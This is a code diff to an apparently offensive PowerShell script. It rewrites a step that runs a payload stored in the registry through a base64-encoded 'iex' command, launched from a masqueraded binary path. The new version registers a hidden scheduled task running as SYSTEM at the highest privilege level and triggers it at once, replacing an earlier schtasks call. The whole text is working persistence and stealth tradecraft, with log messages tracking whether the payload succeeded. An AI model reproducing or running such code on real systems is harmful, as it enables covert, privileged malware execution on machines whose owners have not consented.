@@ -108,19 +108,20 @@ if ($checkVal) {
     Write-Log "[-] Registry payload FAILED"
 }
 
-# 5. Create scheduled task with dynamic time (30s from now) via schtasks /Z
+# 5. Create scheduled task with dynamic time via Register-ScheduledTask
 $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
     "iex(gp '$regPath').$regName"
 ))
-$taskTime = (Get-Date).AddMinutes(2).ToString("HH:mm")
-$taskDate = (Get-Date).AddMinutes(2).ToString("MM/dd/yyyy")
-$taskCmd = "schtasks /create /tn $taskName /ru SYSTEM /tr `"$masqueradeDst -NoP -Enc $b64`" /sc ONCE /sd $taskDate /st $taskTime /Z /f"
-$result = cmd /c $taskCmd 2>&1
-if ($LASTEXITCODE -eq 0) {
+$action = New-ScheduledTaskAction -Execute $masqueradeDst -Argument "-NoP -Enc $b64"
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2)
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -ExecutionTimeLimit ([TimeSpan]::FromMinutes(5))
+try {
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop
     Write-Log "[+] Task $taskName created (verified)"
     Write-Host "[+] Scheduled. Waiting 2m for execution..."
     Start-ScheduledTask -TaskName $taskName
     Write-Log "[*] Task $taskName triggered"
-} else {
-    Write-Log "[-] Task creation FAILED`n$($result | Out-String)"
+} catch {
+    Write-Log "[-] Task creation FAILED`n$_"
 }
